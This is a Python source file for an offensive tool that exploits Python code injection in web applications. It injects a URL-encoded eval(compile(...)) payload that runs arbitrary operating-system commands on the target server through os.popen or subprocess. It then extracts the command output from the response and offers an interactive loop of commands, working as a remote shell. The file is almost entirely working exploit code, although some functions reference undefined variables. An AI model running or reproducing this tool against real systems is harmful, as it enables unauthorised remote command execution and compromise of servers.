#!/usr/bin/env python

"""
 Authors: Seth Art (sethsec@gmail.com, @sethsec), Charlie Worrell (@decidedlygray, https://keybase.io/decidedlygray)
 Purpose: Tool for exploiting web application based Python Code Injection Vulnerabilities  
          
"""



import requests, re, optparse, urllib, os


def parse_url(command,user_url,user_param=None):
    print user_param
    insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
    #insert = '''eval(compile("""for x in range(1):\\n import subprocess\\n print("-"*50)\\n subprocess.Popen(r'%s', shell=True,stdout=subprocess.PIPE).stdout.read()""",'PyCodeInjectionShell','single'))''' % command
    encoded = urllib.quote(insert)
    print user_param    
    if user_param == None:
        # Look for the * and replace * with the payload
        split_user_url = user_url.split('*')
        url = '%s%s%s' % (split_user_url[0],encoded,split_user_url[1])
    else:
        # Look for the user specified parameter and replace the parameter value with the payload
        split_user_url = user_url.split("%s=" % user_param)
        suffix = split_user_url[1].split('&')[1]
        url = '%s%s=%s&%s' % (split_user_url[0],user_param,encoded,suffix)

    
    
    print("URL sent to server: " + url)
    return url

def parse_request(command,filename,user_param=None):
    with open(filename,'rb') as file:
        insert = '''eval(compile("""for x in range(1):\\n import os\\n print("-"*50)\\n os.popen(r'%s').read()""",'PyCodeInjectionShell','single'))''' % command
        encoded = urllib.quote(insert)
        request1 = file.read()
        #print request1
        acceptline = re.search('Accept:.*',request1)
        #print str(acceptline.group(0))
        updated = re.sub("\*",encoded, request1)
        updated2 = re.sub('Accept:.*',str(acceptline.group(0)), updated)
        print updated2


def select_command(user_url,user_param=None):
    print user_param
    test1 = '''eval(compile("""for x in range(1):\\n print("PyCodeInjectionShell")""",'PyCodeInjectionShell','single'))'''
    test2 = '''__import__.os.eval(compile("""for x in range(1):\\n print("PyCodeInjectionShell")""",'PyCodeInjectionShell','single'))'''
    test3 = '''eval(compile("""for x in range(1):\\n import os,subprocess\\n print("-"*50)\\n subprocess.Popen(r'%s', shell=True,stdout=subprocess.PIPE).stdout.read()""",'PyCodeInjectionShell','single'))''' % command
    #print name
    encoded = urllib.quote(insert)
    #print encoded
    # Split up URL specified at command line on the *, so that we can insert payload
    split_user_url = user_url.split('*')
    # Recreate the URL with the payload in place of the *
    url = '%s%s%s' % (split_user_url[0],encoded,split_user_url[1])
    print("URL sent to server: " + url)
    response = requests.get(url)
    #print response.headers
    #print response.content
     
    match = re.search('([---------------------------------------------------][\n])(.*)',response.content)

    #print match
    command_output = str(match.group(0))
    print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
    print command_output.replace('\\n','\n')
    # print command_output

def send_request(url,command,body=None):
    response = requests.get(url)
    #print response.headers
    print response.content
    match = re.search('([--------------------------------------------------][\n])(.*)',response.content)
    command_output = str(match.group(0))
    print '\n\n{}\nOUTPUT OF: {}\n{}\n'.format('-'*30,command,'-'*30)
    print command_output.replace('\\n','\n').replace('\\t','\t')
    # print command_output


# Ripped from https://raw.githubusercontent.com/sqlmapproject/sqlmap/044f05e772d0787489bdf7bc220a5dfc76714b1d/lib/core/common.py
def checkFile(filename, raiseOnError=True):
    """
    Checks for file existence and readability
    """

    valid = True

    try:
        if filename is None or not os.path.isfile(filename):
            valid = False
    except UnicodeError:
        valid = False

    if valid:
        try:
            with open(filename, "rb"):
                pass
        except:
            valid = False

    if not valid and raiseOnError:
        raise Exception("unable to read file '%s'" % filename)

    return valid

        
if __name__ == '__main__':

    parser = optparse.OptionParser(usage='python %prog -c command -p param -u URL\n\
       python %prog -c command -p param -r request.file\n')       
    parser.add_option('-c', dest='cmd', help='Enter the OS command you want to run at the command line')
    parser.add_option('-i', action="store_true", dest='interactive', help='Interactivly enter OS commands until finished')
    parser.add_option('-u', dest='url', help='Specify the URL. URLs can use * or -p to set injection point')
    parser.add_option('-p', dest='parameter', help='Specify injection parameter. This is used instead of *')
    parser.add_option('-r', dest='request', help='Specify locally saved request file instead of a URL. Works with * or -p')
    
        
    (options, args) = parser.parse_args()
    #cmd = options.command
    #url = options.url
    request = options.request
    #parameter = options.parameter
    #print options.parameter
    print
    if (options.url) and (options.request):
        print "Either enter a URL or a request file, but not both."
        exit()


    if (options.url) and (options.parameter):
        print("URL entered by user: " + options.url)
        parsed_url = parse_url(options.cmd,options.url,options.parameter)
        send_request(parsed_url,options.cmd)

        if (options.interactive):            
            while True:                
                new_cmd = raw_input("Command:")
                url = parse_url(new_cmd,options.url,options.parameter)
                send_request(url,new_cmd)


    if (options.url) and not (options.parameter):
        print("URL entered by user: " + options.url)

        parsed_url = parse_url(options.cmd,options.url,options.parameter)
        send_request(parsed_url,options.cmd)
        if (options.interactive):            
            while True:                
                new_cmd = raw_input("Command:")
                url = parse_url(new_cmd,options.url,options.parameter)
                send_request(url,new_cmd)
                

    if (options.request):
        checkFile(options.request)
        parsed_request = parse_request(options.cmd,options.request,options.parameter)
        #send_request(url,options.cmd)
        



        

